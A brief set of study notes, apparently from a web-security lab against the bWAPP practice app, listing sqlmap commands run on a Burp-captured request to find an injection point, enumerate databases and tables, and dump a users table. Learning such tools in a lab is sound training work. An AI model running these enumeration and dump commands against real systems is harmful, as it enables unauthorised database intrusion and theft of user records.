## using sqlmap
1. Get an error and intrecept the traffic using burp
2. Copy the request to afile
3. After title replace the ' with *
4. Execute sqlmap - sqlmap -r myreq.txt
5. Chek the output in /root/.sqlmap/output/localhost/log
6. Enumerate all the databases - sqlmap -r myreq.txt --dbs
7. Enumerate all the tables - sqlmap -r myreq.txt --dbs --tables
8. Dump all the users from a specific table into a dump file - sqlmap -r myreq.txt
    -D bWAPP -T users --dump